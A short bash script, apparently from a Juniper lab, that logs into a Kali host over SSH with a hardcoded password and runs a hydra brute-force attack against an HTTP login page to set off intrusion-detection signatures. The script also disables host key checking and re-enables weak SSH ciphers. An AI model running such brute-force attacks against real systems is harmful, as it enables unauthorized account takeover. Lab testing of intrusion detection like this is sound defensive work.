#!/bin/bash
# HTTP brute force attack from Kali using hydra
# Triggers: HTTP:BRUTE:* IDP signatures

SSH_OPTS="-o StrictHostKeyChecking=no -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes256-cbc,aes128-cbc"
KALI="100.123.38.1"
TARGET="192.168.20.2"

echo "=== HTTP Brute Force Attack ==="
echo "Attacker : Kali (192.168.10.2)"
echo "Target   : Linux (${TARGET}:80)"
echo "Tool     : hydra"
echo "Triggers : HTTP brute force IDP signatures"
echo ""
echo "Starting brute force..."
echo "(With IDP active, connections will be reset)"
echo ""

sshpass -p 'Juniper!1' ssh $SSH_OPTS jcluser@$KALI \
    "hydra -l admin -P /usr/share/wordlists/rockyou.txt \
     -t 4 -f -e nsr \
     -s 80 ${TARGET} http-get /login \
     2>&1 | tail -20" 2>/dev/null

echo ""
echo "Attack complete. Check monitor-idp.sh for IDP hit counters."
